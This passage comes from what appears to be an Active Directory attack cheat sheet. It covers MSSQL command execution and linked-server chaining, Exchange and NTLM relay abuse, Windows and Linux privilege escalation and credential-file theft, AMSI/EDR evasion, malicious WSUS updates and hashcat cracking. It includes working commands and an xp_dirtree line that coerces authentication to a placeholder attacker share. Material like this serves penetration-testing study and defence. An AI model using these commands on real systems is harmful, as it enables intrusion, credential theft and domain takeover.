  <div class="detail-card border-orange"><span class="tag lateral">MSSQL</span><h3>Initial Access to MSSQL</h3><div class="card-sub">Finding and authenticating to SQL Servers</div><div class="card-body"><ul class="card-list"><li><strong>Discover</strong>: <code class="tool">netexec</code> mssql 10.0.0.0/24 &mdash; finds SQL Server instances across subnet</li><li><strong>UDP scan</strong>: SQL Browser service on <strong>UDP 1434</strong> reveals instance names and ports</li><li><strong>Default SA</strong>: <code>sa</code> with blank or weak password &mdash; <code class="tool">netexec</code> mssql target -u sa -p ''</li><li><strong>Domain auth</strong>: Kerberos/NTLM auth to SQL with domain creds &mdash; <code class="tool">mssqlclient.py</code> domain/user:pass@target -windows-auth</li><li><strong>SPN discovery</strong>: <code>GetUserSPNs.py</code> &mdash; MSSQLSvc/ SPNs reveal SQL servers and service accounts</li><li><strong>Public role</strong>: Even the <code>public</code> role can enumerate databases, linked servers, and impersonation</li></ul></div></div>

  <div class="detail-card border-red"><span class="tag privesc">MSSQL</span><h3>xp_cmdshell &amp; Code Execution</h3><div class="card-sub">SQL Server to OS command execution</div><div class="card-body"><ul class="card-list"><li><strong>xp_cmdshell</strong>: Execute OS commands as SQL service account &mdash; often <code class="vuln">NT SERVICE\MSSQLSERVER</code> or a domain service account</li><li><strong>Enable if disabled</strong>: <code>EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;</code> (requires sysadmin)</li><li><strong>Requires</strong>: <code>show advanced options</code> enabled first</li><li><strong>Alternative</strong>: <code>sp_OACreate</code> + <code>sp_OAMethod</code> for COM object execution</li><li><strong>Alternative</strong>: CLR assembly &mdash; load .NET DLL into SQL for code execution</li><li><strong>Alternative</strong>: <code>OPENROWSET</code> with bulk loading to read local files</li></ul></div></div>

  <div class="detail-card border-cyan"><span class="tag lateral">MSSQL</span><h3>Linked Servers</h3><div class="card-sub">SQL-to-SQL lateral movement across the domain</div><div class="card-body"><ul class="card-list"><li><strong>Enumerate links</strong>: <code>SELECT * FROM master..sysservers</code> or <code>EXEC sp_linkedservers</code></li><li><strong>Execute on linked server</strong>: <code>EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER]</code></li><li><strong>Chain links</strong>: Server A &rarr; Server B &rarr; Server C &mdash; crawl through link chains</li><li><strong>Double hop</strong>: <code>EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [SERVER_C]') AT [SERVER_B]</code></li><li><strong>Privilege escalation</strong>: Linked server may run as <code class="vuln">sa</code> or high-priv account on remote instance</li><li><strong>Tools</strong>: <code class="tool">mssqlclient.py</code> enum_links, <code class="tool">PowerUpSQL</code> Get-SQLServerLinkCrawl</li></ul></div></div>

  <div class="detail-card border-purple"><span class="tag privesc">MSSQL</span><h3>Impersonation &amp; Privilege Escalation</h3><div class="card-sub">Become sysadmin without being sysadmin</div><div class="card-body"><ul class="card-list"><li><strong>Impersonation</strong>: <code>EXECUTE AS LOGIN = 'sa'</code> &mdash; if IMPERSONATE permission is granted</li><li><strong>Check</strong>: <code>SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE'</code></li><li><strong>Trustworthy DB</strong>: If a database is <code class="vuln">TRUSTWORTHY</code> and owned by sa, db_owner can escalate to sysadmin</li><li><strong>Check</strong>: <code>SELECT name, is_trustworthy_on FROM sys.databases</code></li><li><strong>NTLM capture</strong>: <code>EXEC xp_dirtree '\\attacker\share'</code> &mdash; forces SQL service account NTLM auth to attacker</li><li><strong>NTLM relay</strong>: Relay captured SQL service hash to LDAP/SMB for domain-level access</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== EXCHANGE ATTACKS ==================== -->
<div class="section-header"><h2><span>//</span> Exchange Server <span class="red">Attacks</span></h2><p class="section-desc">On-prem Exchange holds extraordinary AD privileges. The Exchange Trusted Subsystem and Organization Management groups provide direct paths to domain compromise.</p></div>

<div class="details-grid">
  <div class="detail-card border-red"><span class="tag privesc">EXCHANGE</span><h3>Exchange Permission Abuse</h3><div class="card-sub">Exchange groups have excessive AD permissions by default</div><div class="card-body"><ul class="card-list"><li><strong>Exchange Windows Permissions</strong> group: Has <code class="vuln">WriteDACL on the domain root</code> &mdash; can grant DCSync rights</li><li><strong>Exchange Trusted Subsystem</strong>: Member of above group &mdash; the Exchange servers themselves have WriteDACL</li><li><strong>Organization Management</strong>: Full control over Exchange &mdash; can modify these permissions</li><li><strong>Attack</strong>: Compromise any Exchange server &rarr; use its machine account to WriteDACL &rarr; grant DCSync &rarr; dump all hashes</li><li><strong>PrivExchange</strong>: Coerce Exchange to authenticate &rarr; relay to LDAP &rarr; WriteDACL as Exchange &rarr; DCSync</li><li><code class="tool">ntlmrelayx</code> --escalate-user attacker --target ldap://DC</li></ul></div></div>

  <div class="detail-card border-orange"><span class="tag cred">EXCHANGE</span><h3>Exchange CVEs</h3><div class="card-sub">Critical vulnerabilities in Exchange Server</div><div class="card-body"><ul class="card-list"><li><strong>ProxyLogon</strong> (CVE-2021-26855): SSRF + RCE &mdash; <span class="vuln">unauthenticated</span> remote code execution as SYSTEM</li><li><strong>ProxyShell</strong> (CVE-2021-34473/34523/31207): Auth bypass + privilege escalation + RCE chain</li><li><strong>ProxyNotShell</strong> (CVE-2022-41040/41082): SSRF + RCE, requires authentication</li><li><strong>Impact</strong>: Exchange runs as <strong>SYSTEM</strong> with high AD privileges &mdash; RCE = near-instant domain compromise</li><li><strong>Mailbox access</strong>: Even without RCE, accessing mailboxes reveals passwords, VPN configs, sensitive data</li><li><strong>Ruler</strong>: Abuse Outlook rules/forms for code execution via compromised mailbox credentials</li></ul></div></div>

  <div class="detail-card border-cyan"><span class="tag lateral">EXCHANGE</span><h3>Post-Exploitation via Exchange</h3><div class="card-sub">What you can do once you have Exchange access</div><div class="card-body"><ul class="card-list"><li><strong>Mailbox search</strong>: <code class="tool">MailSniper</code> &mdash; search all mailboxes for "password", "vpn", "credentials"</li><li><strong>GAL extraction</strong>: Global Address List gives you all email addresses/usernames for spraying</li><li><strong>Delegate access</strong>: Grant yourself full access to any mailbox via PowerShell</li><li><strong>Transport rules</strong>: BCC all emails to attacker &mdash; persistent email surveillance</li><li><strong>OWA credential harvesting</strong>: Modify OWA login page to capture credentials</li><li><strong>Exfiltration</strong>: Export mailboxes as PST files for offline analysis</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== LOCAL PRIVILEGE ESCALATION ==================== -->
<div class="section-header"><h2><span>//</span> Local <span class="red">Privilege Escalation</span></h2><p class="section-desc">Before you can dump LSASS or pivot, you typically need local admin. These are the most common Windows local privesc paths encountered in AD environments.</p></div>

<div class="details-grid">
  <div class="detail-card border-red"><span class="tag privesc">LOCAL PE</span><h3>Potato Attacks (Token Impersonation)</h3><div class="card-sub">SeImpersonatePrivilege &rarr; SYSTEM</div><div class="card-body"><ul class="card-list"><li>Service accounts (IIS, MSSQL, etc.) have <code class="vuln">SeImpersonatePrivilege</code> by default</li><li><strong>JuicyPotato</strong>: Abuses COM DCOM activation &mdash; works on Server 2016/2019</li><li><strong>PrintSpoofer</strong>: Abuses named pipe impersonation via Print Spooler &mdash; works on Server 2019+</li><li><strong>GodPotato</strong>: Works on all Windows versions from 8 to 11, Server 2012 to 2022</li><li><strong>SweetPotato</strong>: Combines multiple potato techniques into one tool</li><li><strong>RoguePotato</strong>: Works when other potatoes are blocked &mdash; uses remote OXID resolution</li><li><strong>Usage</strong>: <code class="tool">GodPotato.exe</code> -cmd "cmd /c whoami" &rarr; <code>NT AUTHORITY\SYSTEM</code></li></ul></div></div>

  <div class="detail-card border-orange"><span class="tag privesc">LOCAL PE</span><h3>Service Misconfigurations</h3><div class="card-sub">Weak service permissions &amp; unquoted paths</div><div class="card-body"><ul class="card-list"><li><strong>Unquoted service paths</strong>: <code>C:\Program Files\Some App\service.exe</code> &rarr; place <code>C:\Program.exe</code> &mdash; runs as service account</li><li><strong>Weak service permissions</strong>: If you can modify a service binary or config &rarr; replace with payload</li><li><strong>Writable service directory</strong>: DLL hijacking by placing malicious DLL in service directory</li><li><strong>AlwaysInstallElevated</strong>: If both HKLM and HKCU keys are set &rarr; install MSI as SYSTEM</li><li><strong>Enumeration</strong>: <code class="tool">winPEAS</code> or <code class="tool">PowerUp</code> Invoke-AllChecks for automated discovery</li><li><strong>Check</strong>: <code>sc qc servicename</code> to see binary path and service account</li></ul></div></div>

  <div class="detail-card border-purple"><span class="tag privesc">LOCAL PE</span><h3>Credential Harvesting (Local)</h3><div class="card-sub">Find credentials without admin access</div><div class="card-body"><ul class="card-list"><li><strong>PowerShell history</strong>: <code>%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></li><li><strong>Saved credentials</strong>: <code>cmdkey /list</code> &mdash; shows stored Windows credentials</li><li><strong>Unattend files</strong>: <code>C:\Windows\Panther\unattend.xml</code> may contain plaintext admin passwords</li><li><strong>Web config files</strong>: IIS <code>web.config</code>, connection strings with database passwords</li><li><strong>Registry autologon</strong>: <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code> &mdash; DefaultPassword</li><li><strong>Scheduled tasks</strong>: <code>schtasks /query /fo LIST /v</code> &mdash; may reveal run-as accounts</li><li><strong>WiFi passwords</strong>: <code>netsh wlan show profile name="SSID" key=clear</code></li></ul></div></div>

  <div class="detail-card border-green"><span class="tag privesc">LOCAL PE</span><h3>Kernel &amp; Miscellaneous</h3><div class="card-sub">Other escalation paths</div><div class="card-body"><ul class="card-list"><li><strong>Kernel exploits</strong>: Missing patches &mdash; check with <code class="tool">Watson</code> or <code class="tool">windows-exploit-suggester</code></li><li><strong>SeBackupPrivilege</strong>: Can read any file including SAM/NTDS.dit &mdash; use <code>robocopy /b</code></li><li><strong>SeRestorePrivilege</strong>: Can write any file &mdash; overwrite service binaries or DLLs</li><li><strong>SeLoadDriverPrivilege</strong>: Load kernel driver &mdash; load vulnerable driver for arbitrary kernel read/write</li><li><strong>SeDebugPrivilege</strong>: Debug any process &mdash; inject into LSASS or other privileged processes</li><li><strong>LAPS readable</strong>: If user can read LAPS password attribute &mdash; instant local admin on target</li><li><strong>Tools</strong>: <code class="tool">winPEAS</code>, <code class="tool">PowerUp</code>, <code class="tool">Seatbelt</code>, <code class="tool">SharpUp</code> for automated enumeration</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== LINUX IN AD ==================== -->
<div class="section-header"><h2><span>//</span> Linux <span class="green">in AD</span></h2><p class="section-desc">Modern environments join Linux to AD via SSSD, Winbind, or Samba. These machines store Kerberos tickets and keytabs that attackers can leverage.</p></div>

<div class="details-grid">
  <div class="detail-card border-green"><span class="tag lateral">LINUX</span><h3>Kerberos Artifacts on Linux</h3><div class="card-sub">Where tickets and keys live on Linux systems</div><div class="card-body"><ul class="card-list"><li><strong>ccache files</strong>: Kerberos ticket caches &mdash; default at <code>/tmp/krb5cc_UID</code> or <code>KRB5CCNAME</code> env var</li><li><strong>Steal tickets</strong>: Copy ccache file &rarr; <code>export KRB5CCNAME=/path/to/stolen.ccache</code> &rarr; use with impacket tools</li><li><strong>Keytab files</strong>: Contains long-term Kerberos keys &mdash; <code>/etc/krb5.keytab</code> (machine account key)</li><li><strong>Extract from keytab</strong>: <code class="tool">klist -k -t /etc/krb5.keytab</code> &mdash; shows principals and encryption types</li><li><strong>Use keytab</strong>: <code>kinit -k -t /etc/krb5.keytab MACHINE$@DOMAIN</code> &mdash; get TGT as machine account</li><li><strong>SSSD cache</strong>: <code>/var/lib/sss/db/</code> &mdash; may contain cached credentials (tdb files)</li></ul></div></div>

  <div class="detail-card border-orange"><span class="tag cred">LINUX</span><h3>SSSD &amp; Winbind Exploitation</h3><div class="card-sub">Extracting credentials from AD-joined Linux</div><div class="card-body"><ul class="card-list"><li><strong>SSSD secrets</strong>: <code>/var/lib/sss/secrets/secrets.ldb</code> &mdash; may store cleartext domain passwords</li><li><strong>SSSD cache</strong>: <code>/var/lib/sss/db/cache_DOMAIN.ldb</code> &mdash; cached password hashes (SHA-512)</li><li><strong>Keytab extraction</strong>: Machine keytab contains the computer account's Kerberos keys &mdash; equivalent to NT hash</li><li><strong>Convert keytab to hash</strong>: Extract AES/RC4 keys from keytab &rarr; use for Pass-the-Key / Over-pass-the-Hash</li><li><strong>Winbind</strong>: <code>/var/lib/samba/private/secrets.tdb</code> &mdash; machine account password in Samba's secrets database</li><li><strong>/etc/krb5.conf</strong>: Shows domain/realm configuration, KDC addresses &mdash; useful for targeting</li></ul></div></div>

  <div class="detail-card border-blue"><span class="tag recon">LINUX</span><h3>Attacking from Linux</h3><div class="card-sub">Linux as your attack platform for AD</div><div class="card-body"><ul class="card-list"><li><strong>Impacket suite</strong>: The primary Linux AD attack toolkit &mdash; secretsdump, getST, ntlmrelayx, ticketer, etc.</li><li><strong>Kerberos auth from Linux</strong>: <code>export KRB5CCNAME=admin.ccache</code> &rarr; <code class="tool">secretsdump.py</code> -k -no-pass DC</li><li><strong>netexec</strong>: Swiss army knife &mdash; SMB, LDAP, MSSQL, WinRM, RDP, SSH enumeration and exploitation</li><li><strong>bloodhound-python</strong>: BloodHound data collection from Linux &mdash; no need to run on Windows</li><li><strong>certipy</strong>: Full ADCS exploitation suite from Linux</li><li><strong>krbrelayx</strong>: Kerberos relay + unconstrained delegation exploitation from Linux</li><li><strong>Ticket conversion</strong>: <code class="tool">ticketConverter.py</code> &mdash; convert between .kirbi (Windows) and .ccache (Linux)</li></ul></div></div>

  <div class="detail-card border-red"><span class="tag privesc">LINUX</span><h3>Pivoting Through Linux Hosts</h3><div class="card-sub">Using compromised Linux in AD for lateral movement</div><div class="card-body"><ul class="card-list"><li><strong>SSH keys</strong>: <code>~/.ssh/</code> &mdash; private keys for accessing other Linux hosts (authorized_keys, known_hosts for targets)</li><li><strong>sudo misconfigurations</strong>: <code>sudo -l</code> &mdash; check what the user can run as root</li><li><strong>Docker/container escape</strong>: If user is in docker group &mdash; <code class="vuln">trivial root escalation</code></li><li><strong>Cron jobs</strong>: <code>/etc/crontab</code>, <code>/var/spool/cron/</code> &mdash; writable scripts running as root</li><li><strong>Ansible/Puppet/Chef</strong>: Config management stores credentials and connects to many hosts</li><li><strong>History files</strong>: <code>~/.bash_history</code>, <code>~/.mysql_history</code> &mdash; cleartext passwords in command history</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== AMSI / CLM / AV EVASION ==================== -->
<div class="section-header"><h2><span>//</span> AMSI / CLM / <span class="red">Evasion</span> Basics</h2><p class="section-desc">Before your tools can run, you may need to bypass endpoint protections. Understanding these defenses helps you choose the right approach.</p></div>

<div class="details-grid">
  <div class="detail-card border-red"><span class="tag privesc">EVASION</span><h3>AMSI (Anti-Malware Scan Interface)</h3><div class="card-sub">Real-time script content scanning</div><div class="card-body"><ul class="card-list"><li><strong>What it does</strong>: Scans PowerShell, VBScript, JScript, .NET content <strong>before execution</strong></li><li>Catches: Invoke-Mimikatz, PowerView, SharpHound, etc. even if loaded in-memory</li><li><strong>amsi.dll</strong> loaded into every PowerShell process &mdash; hooks <code>AmsiScanBuffer</code> function</li><li><strong>Bypass concept</strong>: Patch <code>AmsiScanBuffer</code> in memory to always return "clean" result</li><li><strong>Detection</strong>: Known bypass strings are themselves flagged &mdash; requires obfuscation</li><li><strong>Alternative</strong>: Use compiled .NET tools (SharpCollection) instead of PowerShell scripts</li><li><strong>Alternative</strong>: Use Python/Linux tools (impacket, netexec) from attacker machine &mdash; no AMSI</li></ul></div></div>

  <div class="detail-card border-orange"><span class="tag privesc">EVASION</span><h3>CLM &amp; AppLocker / WDAC</h3><div class="card-sub">Constrained Language Mode &amp; application whitelisting</div><div class="card-body"><ul class="card-list"><li><strong>CLM</strong>: Restricts PowerShell to basic cmdlets &mdash; blocks .NET, COM, Add-Type, Invoke-Expression</li><li><strong>Check</strong>: <code>$ExecutionContext.SessionState.LanguageMode</code> &mdash; "ConstrainedLanguage" = locked down</li><li><strong>AppLocker</strong>: Whitelists which executables/scripts/DLLs can run &mdash; based on path, hash, or publisher</li><li><strong>WDAC</strong> (Windows Defender Application Control): Kernel-level code integrity &mdash; <strong>much harder</strong> to bypass than AppLocker</li><li><strong>AppLocker bypass</strong>: Run from whitelisted paths (<code>C:\Windows\Temp\</code>), use <code class="tool">MSBuild.exe</code>, <code class="tool">InstallUtil.exe</code> (LOLBAS)</li><li><strong>CLM bypass</strong>: Use <code class="tool">PSBypassCLM</code>, custom C# runner, or compiled .NET tools</li></ul></div></div>

  <div class="detail-card border-purple"><span class="tag privesc">EVASION</span><h3>AV/EDR Evasion Concepts</h3><div class="card-sub">Understanding detection to choose the right tools</div><div class="card-body"><ul class="card-list"><li><strong>Signature-based</strong>: Known malware hashes/strings &mdash; bypass by recompiling, obfuscating, or custom tooling</li><li><strong>Heuristic/Behavioral</strong>: Suspicious API call sequences &mdash; harder to evade, requires understanding detection logic</li><li><strong>ETW (Event Tracing)</strong>: Feeds events to EDR &mdash; patching ETW providers can blind the EDR</li><li><strong>Kernel callbacks</strong>: EDR registers callbacks for process/thread creation &mdash; removing callbacks = blinding</li><li><strong>Practical approach</strong>: Use remote tools from Linux (impacket, netexec) &mdash; <span class="vuln">no binary on target = no AV detection</span></li><li><strong>Living off the land</strong>: Use <code class="tool">LOLBAS</code> binaries (certutil, mshta, rundll32) for execution</li><li><strong>Bring Your Own Vulnerable Driver (BYOVD)</strong>: Load vulnerable signed driver to disable EDR kernel hooks</li></ul></div></div>

  <div class="detail-card border-cyan"><span class="tag lateral">EVASION</span><h3>Practical Evasion Strategy</h3><div class="card-sub">Decision tree for tool selection</div><div class="card-body"><ul class="card-list"><li><strong>Prefer remote tools</strong>: impacket/netexec/certipy from Linux &mdash; nothing touches target disk or memory</li><li><strong>If you must run on target</strong>: Use compiled .NET (SharpCollection) over PowerShell scripts</li><li><strong>If .NET is blocked</strong>: Use Go/Nim/Rust compiled tools &mdash; less detected than .NET/C#</li><li><strong>For credential access</strong>: <code class="tool">lsassy</code> remotely or <code class="tool">procdump</code> (signed Microsoft binary) + offline <code class="tool">pypykatz</code></li><li><strong>For enumeration</strong>: <code class="tool">bloodhound-python</code> from Linux &mdash; no SharpHound needed on target</li><li><strong>For lateral movement</strong>: <code class="tool">evil-winrm</code> (legitimate WinRM) or <code class="tool">wmiexec</code> (no service creation)</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== WSUS ATTACKS ==================== -->
<div class="section-header"><h2><span>//</span> WSUS <span class="red">Attacks</span></h2><p class="section-desc">Windows Server Update Services pushes updates to all domain machines. Compromise the WSUS server or its database, and you can push malicious "updates" to every client.</p></div>

<div class="details-grid">
  <div class="detail-card border-red"><span class="tag privesc">WSUS</span><h3>SharpWSUS &mdash; Malicious Update Deployment</h3><div class="card-sub">Push arbitrary commands via fake Windows updates</div><div class="card-body"><ul class="card-list"><li><strong>Prereq</strong>: Local admin on WSUS server or write access to its MSSQL database (WID or SQL Server)</li><li><strong>How it works</strong>: Inject a fake update into the WSUS database &rarr; all clients in the target group download and execute it as <code class="vuln">NT AUTHORITY\SYSTEM</code></li><li><strong>Create update</strong>: <code class="tool">SharpWSUS.exe</code> create /payload:"C:\Windows\System32\cmd.exe" /args:"/c ..." /title:"Security Update"</li><li><strong>Approve</strong>: <code class="tool">SharpWSUS.exe</code> approve /updateid:GUID /computername:TARGET /groupname:"All Computers"</li><li><strong>Limitation</strong>: Payload must be a <strong>signed Microsoft binary</strong> (e.g., cmd.exe, msiexec.exe, PsExec.exe)</li><li><strong>Workaround</strong>: Use <code>PsExec.exe</code> (signed) to launch your actual payload, or <code>msiexec.exe</code> with malicious MSI from UNC path</li></ul></div></div>

  <div class="detail-card border-orange"><span class="tag lateral">WSUS</span><h3>WSUS MITM &amp; HTTP Abuse</h3><div class="card-sub">Intercept update traffic if WSUS uses HTTP</div><div class="card-body"><ul class="card-list"><li><strong>HTTP WSUS</strong>: If WSUS is configured with <code class="vuln">HTTP (not HTTPS)</code>, updates can be intercepted</li><li><strong>MITM</strong>: ARP spoof or ADIDNS poison &rarr; redirect WSUS traffic &rarr; serve malicious updates</li><li><strong>Tools</strong>: <code class="tool">WSUSpendu</code> for WSUS database injection, <code class="tool">pywsus</code> for MITM proxy</li><li><strong>Check WSUS URL</strong>: <code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate /v WUServer</code></li><li><strong>If HTTPS</strong>: Cannot MITM, need direct WSUS server/database compromise</li><li><strong>Scope</strong>: Affects all computers in WSUS target group &mdash; potentially <span class="vuln">every domain machine</span></li></ul></div></div>

  <div class="detail-card border-blue"><span class="tag recon">WSUS</span><h3>Detection &amp; Enumeration</h3><div class="card-sub">Finding and auditing WSUS</div><div class="card-body"><ul class="card-list"><li><strong>Find WSUS server</strong>: GPO settings, registry key above, or LDAP: <code>(&amp;(objectClass=serviceConnectionPoint)(cn=WSUSServer))</code></li><li><strong>Database location</strong>: WID (Windows Internal Database) at <code>\\.\pipe\MICROSOFT##WID\tsql\query</code> or remote SQL Server</li><li><strong>Detection</strong>: Monitor WSUS database for unsigned/unexpected update entries</li><li><strong>Detection</strong>: Unusual update approvals, updates targeting specific computers</li><li><strong>Mitigation</strong>: Use HTTPS for WSUS, restrict WSUS admin access, audit update approvals</li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== gMSA DEEP DIVE ==================== -->
<div class="section-header"><h2><span>//</span> gMSA <span class="orange">Deep Dive</span></h2><p class="section-desc">Group Managed Service Accounts have automatically rotated 256-char passwords managed by AD. If you can read msDS-ManagedPassword, you get the keys to the kingdom.</p></div>

<div class="details-grid">
  <div class="detail-card border-orange"><span class="tag cred">gMSA</span><h3>How gMSA Works</h3><div class="card-sub">AD-managed service accounts with auto-rotating passwords</div><div class="card-body"><ul class="card-list"><li><strong>Password</strong>: 256-character, automatically rotated every <strong>30 days</strong> (configurable)</li><li><strong>Stored in</strong>: <code>msDS-ManagedPassword</code> attribute (LDAP blob, not human-readable)</li><li><strong>Who can read it</strong>: Defined by <code>msDS-GroupMSAMembership</code> &mdash; usually specific computer accounts or groups</li><li><strong>Contains</strong>: Current password, previous password, query intervals</li><li><strong>Purpose</strong>: Run services without humans managing passwords &mdash; used for SQL, IIS, scheduled tasks, etc.</li><li><strong>KDS Root Key</strong>: Domain-wide key used to derive gMSA passwords &mdash; stored in AD</li></ul></div></div>

  <div class="detail-card border-red"><span class="tag privesc">gMSA</span><h3>Reading gMSA Passwords</h3><div class="card-sub">Extract the managed password if you have read access</div><div class="card-body"><ul class="card-list"><li><strong>Check who can read</strong>: <code>Get-ADServiceAccount -Identity gMSA$ -Properties msDS-GroupMSAMembership</code></li><li><strong>From authorized host</strong>: <code class="tool">gMSADumper.py</code> domain/user:pass@DC &mdash; extracts NT hash from msDS-ManagedPassword</li><li><strong>Python</strong>: <code class="tool">bloodyAD</code> get object gMSA$ --attr msDS-ManagedPassword</li><li><strong>PowerShell</strong>: <code>(Get-ADServiceAccount -Identity gMSA$ -Properties msDS-ManagedPassword).'msDS-ManagedPassword'</code></li><li><strong>Output</strong>: NT hash of the gMSA account &mdash; can be used for Pass-the-Hash, Silver Ticket, etc.</li><li><strong>Common finding</strong>: <span class="vuln">Too many principals</span> in msDS-GroupMSAMembership &mdash; low-priv users can read the password</li></ul></div></div>

  <div class="detail-card border-purple"><span class="tag privesc">gMSA</span><h3>gMSA Exploitation Paths</h3><div class="card-sub">What you can do with a gMSA hash</div><div class="card-body"><ul class="card-list"><li><strong>Pass-the-Hash</strong>: gMSA hash works just like any NT hash &mdash; <code class="tool">netexec</code> smb target -u gMSA$ -H hash</li><li><strong>Silver Ticket</strong>: If gMSA runs a service (SPN), forge TGS for that service</li><li><strong>Kerberos auth</strong>: <code class="tool">getTGT.py</code> domain/gMSA$ -hashes :NTHASH &rarr; get TGT, access any resource the gMSA has permission to</li><li><strong>If gMSA is DA</strong>: Direct domain compromise via Pass-the-Hash &rarr; DCSync</li><li><strong>If gMSA runs SQL</strong>: Authenticate to SQL Server as gMSA &rarr; xp_cmdshell &rarr; SYSTEM</li><li><strong>KDS Root Key abuse</strong>: If you can read <code>CN=Master Root Keys,CN=Group Key Distribution Service</code> &rarr; derive <em>any</em> gMSA password offline with <code class="tool">GoldenGMSA</code></li></ul></div></div>
</div>

<div class="separator"></div>

<!-- ==================== PASSWORD CRACKING METHODOLOGY ==================== -->
<div class="section-header"><h2><span>//</span> Password Cracking <span class="purple">Methodology</span></h2><p class="section-desc">Having the hash is only half the battle. Efficient cracking requires the right wordlists, rules, and strategy for each hash type.</p></div>

<div class="data-flow-card"><h4>Cracking Strategy by Hash Type</h4><pre>
<span class="key">HASH TYPE              SPEED (RTX 4090)    RECOMMENDED STRATEGY</span>
&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;
<span class="val">NT Hash (1000)</span>         <span class="type">~164 GH/s</span>           Rainbow tables first, then wordlist+rules, then mask
<span class="val">Net-NTLMv2 (5600)</span>     <span class="type">~10 GH/s</span>            Wordlist+rules (no rainbow tables, salted)
<span class="val">AS-REP RC4 (18200)</span>    <span class="type">~10 GH/s</span>            Wordlist+rules, then mask attacks
<span class="val">TGS RC4 (13100)</span>       <span class="type">~10 GH/s</span>            Wordlist+rules, then mask (same speed as AS-REP)
<span class="val">TGS AES (19700)</span>       <span class="type">~400 KH/s</span>           <span class="danger">Targeted wordlist only</span> &mdash; too slow for brute force
<span class="val">DCC2 (2100)</span>           <span class="type">~2 MH/s</span>             <span class="danger">Very targeted</span> &mdash; only crack high-value accounts
<span class="val">Net-NTLMv1 (5500)</span>     <span class="type">~</span>                   <span class="val">Convert to NT hash via crack.sh</span> (free service) &mdash; no cracking needed
</pre></div>

<div class="details-grid">
  <div class="detail-card border-purple"><span class="tag cred">CRACKING</span><h3>Wordlists</h3><div class="card-sub">Start with quality wordlists before brute force</div><div class="card-body"><ul class="card-list"><li><strong>rockyou.txt</strong>: 14M passwords &mdash; the baseline, always run first (~130MB)</li><li><strong>SecLists</strong>: github.com/danielmiessler/SecLists &mdash; categorized password lists by type/language</li><li><strong>CrackStation</strong>: 1.5B entries &mdash; massive real-world leak compilation (~15GB)</li><li><strong>Weakpass</strong>: weakpass.com &mdash; huge curated collections sorted by size/quality</li><li><strong>Custom wordlist</strong>: <code class="tool">CeWL</code> to spider company website for keywords, then <code class="tool">hashcat</code> rules to mutate</li><li><strong>Username-based</strong>: Generate from usernames &mdash; firstname.lastname &rarr; Firstname2024! pattern</li><li><strong>Seasonal patterns</strong>: Company2024!, Winter2024, Welcome1, Password123 &mdash; always try these first</li></ul></div></div>

  <div class="detail-card border-orange"><span class="tag cred">CRACKING</span><h3>Rules &amp; Mutations</h3><div class="card-sub">Transform wordlists into millions of candidates</div><div class="card-body"><ul class="card-list"><li><strong>OneRuleToRuleThemAll</strong>: Best single rule file &mdash; 52K rules, excellent hit rate</li><li><strong>dive.rule</strong>: Hashcat built-in, 99K rules &mdash; more thorough but slower</li><li><strong>best64.rule</strong>: Hashcat built-in, quick first pass &mdash; 64 high-probability mutations</li><li><strong>Hob0Rules</strong>: Optimized for corporate passwords &mdash; good for enterprise environments</li><li><strong>Command</strong>: <code>hashcat -m 1000 hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule</code></li><li><strong>Chain rules</strong>: <code>-r rule1.rule -r rule2.rule</code> combines rules (multiplication &mdash; use small rule files)</li><li><strong>Custom rules</strong>: <code>$2$0$2$4</code> appends "2024", <code>^!$1</code> prepends "!" and appends "1"</li></ul></div></div>

  <div class="detail-card border-red"><span class="tag cred">CRACKING</span><h3>Mask &amp; Brute Force Attacks</h3><div class="card-sub">When wordlists fail, try pattern-based attacks</div><div class="card-body"><ul class="card-list"><li><strong>Mask syntax</strong>: <code>?u</code>=uppercase, <code>?l</code>=lowercase, <code>?d</code>=digit, <code>?s</code>=special, <code>?a</code>=all</li><li><strong>Common patterns</strong>:</li><li><code>?u?l?l?l?l?l?d?d</code> &mdash; "Welcome99" pattern (capital + lowercase + 2 digits)</li><li><code>?u?l?l?l?l?l?l?d?d?s</code> &mdash; "Password12!" pattern</li><li><code>?u?l?l?l?l?l?d?d?d?d</code> &mdash; "Company2024" pattern</li><li><strong>Increment</strong>: <code>--increment --increment-min 6 --increment-max 10 ?a?a?a?a?a?a?a?a?a?a</code></li><li><strong>Custom charsets</strong>: <code>-1 ?l?d -2 !@#$ ?u?1?1?1?1?2</code> for targeted patterns</li><li><strong>Hybrid</strong>: <code>hashcat -a 6 wordlist.txt ?d?d?d?d</code> &mdash; wordlist + 4 digit suffix (Password1234)</li></ul></div></div>

